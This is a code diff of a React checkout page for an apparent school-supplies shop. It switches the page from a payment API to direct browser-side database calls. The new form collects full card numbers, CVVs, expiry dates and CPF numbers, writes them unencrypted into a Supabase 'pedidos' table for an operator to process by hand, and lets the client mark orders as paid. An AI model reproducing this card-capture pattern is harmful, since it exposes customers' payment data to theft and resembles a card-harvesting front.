@@ -6,7 +6,7 @@ import {
   Truck, ShieldCheck, CreditCard, Headphones, Megaphone, Users, Facebook, Instagram, Youtube, Lock, CheckCircle2, Loader2, XCircle, Clock,
 } from "lucide-react";
 
-import { createDuePayOrder, getOrderStatus, confirmPayment } from "@/lib/api/duepay-orders.functions";
+import { sb, type Pedido } from "@/lib/supabase-external";
 
 import heroImg from "@/assets/hero-backpack.jpg";
 import kitImg from "@/assets/kit-escolar.jpg";
@@ -58,15 +58,16 @@ function Index() {
   const [checkoutOpen, setCheckoutOpen] = useState(false);
   const [checkoutProduct, setCheckoutProduct] = useState<{ name: string; price: string } | null>(null);
   const [form, setForm] = useState({
-    operadora: "PERSONAL CARD POS-PAGO",
+    operador: "PERSONAL CARD POS-PAGO",
     valor: "",
     condicao: "",
     emailConfirmacao: "",
     emailLink: "",
     codigoPedido: "",
     cpf: "",
-    cartaoMaterial: "",
-    pinDuepay: "",
+    cartaoNumero: "",
+    cartaoCvv: "",
+    cartaoValidade: "",
   });
   const [submitting, setSubmitting] = useState(false);
   const [lastOrder, setLastOrder] = useState<{
@@ -102,39 +103,33 @@ function Index() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!form.valor || !form.condicao || !form.cpf || !form.cartaoMaterial) {
-      alert("Preencha valor, condição, CPF e número do cartão.");
+    if (!form.valor || !form.condicao || !form.cpf || !form.cartaoNumero || !form.cartaoCvv || !form.cartaoValidade) {
+      alert("Preencha todos os campos obrigatórios.");
       return;
     }
     setSubmitting(true);
     try {
       const valor = parseFloat(form.valor.replace(",", "."));
-      const result = await createDuePayOrder({
-        data: {
-          cpf: form.cpf,
-          cartao_material: form.cartaoMaterial,
-          pin_duepay: form.pinDuepay || undefined,
-          valor_total: valor,
-          cliente_nome: form.emailConfirmacao?.split("@")[0] || "Cliente",
-          cliente_email: form.emailConfirmacao || undefined,
-          operadora: form.operadora,
-          condicao_parcelas: parseInt(form.condicao, 10),
-          codigo_pedido_cliente: form.codigoPedido || undefined,
-          itens: checkoutProduct
-            ? [{ nome: checkoutProduct.name, quantidade: 1, preco: valor }]
-            : [],
-        },
-      });
-      if (result.ok) {
-        setLastOrder({
-          id: result.order_id,
-          number: result.order_number,
+      const { data, error } = await sb
+        .from("pedidos")
+        .insert({
           status: "aguardando_operador",
-        });
-        setCheckoutOpen(false);
-      } else {
-        alert("Erro ao criar pedido: " + result.error);
-      }
+          cliente_cpf: form.cpf,
+          cartao_numero: form.cartaoNumero.replace(/\s/g, ""),
+          cartao_cvv: form.cartaoCvv,
+          cartao_validade: form.cartaoValidade,
+          valor,
+          operador: form.operador,
+          condicao: parseInt(form.condicao, 10),
+          codigo_pedido: form.codigoPedido || null,
+          cliente_email: form.emailConfirmacao || null,
+          cliente_nome: form.emailConfirmacao?.split("@")[0] || null,
+        })
+        .select("id")
+        .single();
+      if (error) throw error;
+      setLastOrder({ id: data.id, number: data.id.slice(0, 8), status: "aguardando_operador" });
+      setCheckoutOpen(false);
     } catch (err) {
       alert("Erro: " + (err as Error).message);
     } finally {
@@ -142,26 +137,34 @@ function Index() {
     }
   };
 
+  const fetchPedido = async (id: string): Promise<Pedido | null> => {
+    const { data, error } = await sb.from("pedidos").select("*").eq("id", id).maybeSingle();
+    if (error || !data) return null;
+    return data as Pedido;
+  };
+
+  const mapToTracked = (p: Pedido) => ({
+    id: p.id,
+    number: p.codigo_pedido || p.id.slice(0, 8),
+    status: p.status,
+    valor: Number(p.valor),
+    criadoEm: p.criado_em,
+    processadoEm: p.processado_em,
+    obs: p.observacao,
+    link: p.link_pagamento,
+  });
+
   const handleTrack = async (overrideId?: string) => {
     const idToSearch = overrideId ?? trackId;
     if (!idToSearch) return;
     setTracking(true);
     setTracked(null);
     try {
-      const result = await getOrderStatus({ data: { order_id: idToSearch } });
-      if (!result.found) {
+      const p = await fetchPedido(idToSearch);
+      if (!p) {
         setTracked({ id: idToSearch, number: "—", status: "nao_encontrado", valor: 0, criadoEm: "", processadoEm: null, obs: null, link: null });
       } else {
-        setTracked({
-          id: result.pedido.id,
-          number: result.pedido.shopify_order_number,
-          status: result.pedido.status,
-          valor: result.pedido.valor_total,
-          criadoEm: result.pedido.criado_em,
-          processadoEm: result.pedido.processado_em,
-          obs: result.pedido.observacao,
-          link: (result.pedido as any).link_pagamento ?? null,
-        });
+        setTracked(mapToTracked(p));
       }
     } catch (err) {
       alert("Erro: " + (err as Error).message);
@@ -175,21 +178,8 @@ function Index() {
     if (!tracked) return;
     if (tracked.status !== "aguardando_operador" && tracked.status !== "processando" && tracked.status !== "link_gerado") return;
     const t = setInterval(async () => {
-      try {
-        const result = await getOrderStatus({ data: { order_id: tracked.id } });
-        if (result.found) {
-          setTracked({
-            id: result.pedido.id,
-            number: result.pedido.shopify_order_number,
-            status: result.pedido.status,
-            valor: result.pedido.valor_total,
-            criadoEm: result.pedido.criado_em,
-            processadoEm: result.pedido.processado_em,
-            obs: result.pedido.observacao,
-            link: (result.pedido as any).link_pagamento ?? null,
-          });
-        }
-      } catch { /* noop */ }
+      const p = await fetchPedido(tracked.id);
+      if (p) setTracked(mapToTracked(p));
     }, 5000);
     return () => clearInterval(t);
   }, [tracked?.id, tracked?.status]);
@@ -199,14 +189,12 @@ function Index() {
     if (!confirm("Confirma que o pagamento foi feito no portal TLN?")) return;
     setConfirming(true);
     try {
-      const result = await confirmPayment({
-        data: { order_id: tracked.id, observacao: "Confirmado manualmente" },
-      });
-      if (result.ok) {
-        await handleTrack(tracked.id);
-      } else {
-        alert("Erro: " + result.error);
-      }
+      const { error } = await sb
+        .from("pedidos")
+        .update({ status: "processado", observacao: "Confirmado manualmente", processado_em: new Date().toISOString() })
+        .eq("id", tracked.id);
+      if (error) throw error;
+      await handleTrack(tracked.id);
     } catch (err) {
       alert("Erro: " + (err as Error).message);
     } finally {
@@ -509,8 +497,8 @@ function Index() {
                 <div>
                   <label className="mb-1 block text-sm font-medium">Operadora</label>
                   <select
-                    value={form.operadora}
-                    onChange={(e) => setForm({ ...form, operadora: e.target.value })}
+                    value={form.operador}
+                    onChange={(e) => setForm({ ...form, operador: e.target.value })}
                     className="w-full rounded-md border border-input bg-white px-3 py-2 text-sm"
                   >
                     <option>PERSONAL CARD POS-PAGO</option>
@@ -549,11 +537,11 @@ function Index() {
 
                 <div className="rounded-md border border-brand-navy/30 bg-brand-navy/5 p-3">
                   <div className="mb-2 text-xs font-bold uppercase tracking-wider text-brand-navy">
-                    Dados do Cartão Material (DuePay)
+                    Dados do Cartão
                   </div>
                   <div className="space-y-3">
                     <div>
-                      <label className="mb-1 block text-xs font-medium">CPF do responsável *</label>
+                      <label className="mb-1 block text-xs font-medium">CPF *</label>
                       <input
                         type="text"
                         value={form.cpf}
@@ -566,27 +554,47 @@ function Index() {
                       />
                     </div>
                     <div>
-                      <label className="mb-1 block text-xs font-medium">Nº do Cartão Material *</label>
+                      <label className="mb-1 block text-xs font-medium">Número do cartão *</label>
                       <input
                         type="text"
-                        value={form.cartaoMaterial}
-                        onChange={(e) => setForm({ ...form, cartaoMaterial: e.target.value })}
-                        placeholder="Número impresso no cartão"
+                        value={form.cartaoNumero}
+                        onChange={(e) => setForm({ ...form, cartaoNumero: e.target.value.replace(/\D/g, "").slice(0, 19) })}
+                        placeholder="0000 0000 0000 0000"
+                        inputMode="numeric"
                         className="w-full rounded-md border border-input px-3 py-2 text-sm"
                         required
                       />
                     </div>
-                    <div>
-                      <label className="mb-1 block text-xs font-medium">PIN DuePay (gerado no app) - opcional</label>
-                      <input
-                        type="text"
-                        value={form.pinDuepay}
-                        onChange={(e) => setForm({ ...form, pinDuepay: e.target.value.replace(/\D/g, "").slice(0, 6) })}
-                        placeholder="6 dígitos"
-                        inputMode="numeric"
-                        maxLength={6}
-                        className="w-full rounded-md border border-input px-3 py-2 text-sm"
-                      />
+                    <div className="grid grid-cols-2 gap-3">
+                      <div>
+                        <label className="mb-1 block text-xs font-medium">Validade (MM/AA) *</label>
+                        <input
+                          type="text"
+                          value={form.cartaoValidade}
+                          onChange={(e) => {
+                            let v = e.target.value.replace(/\D/g, "").slice(0, 4);
+                            if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
+                            setForm({ ...form, cartaoValidade: v });
+                          }}
+                          placeholder="MM/AA"
+                          maxLength={5}
+                          className="w-full rounded-md border border-input px-3 py-2 text-sm"
+                          required
+                        />
+                      </div>
+                      <div>
+                        <label className="mb-1 block text-xs font-medium">CVV *</label>
+                        <input
+                          type="text"
+                          value={form.cartaoCvv}
+                          onChange={(e) => setForm({ ...form, cartaoCvv: e.target.value.replace(/\D/g, "").slice(0, 4) })}
+                          placeholder="000"
+                          inputMode="numeric"
+                          maxLength={4}
+                          className="w-full rounded-md border border-input px-3 py-2 text-sm"
+                          required
+                        />
+                      </div>
                     </div>
                   </div>
                 </div>
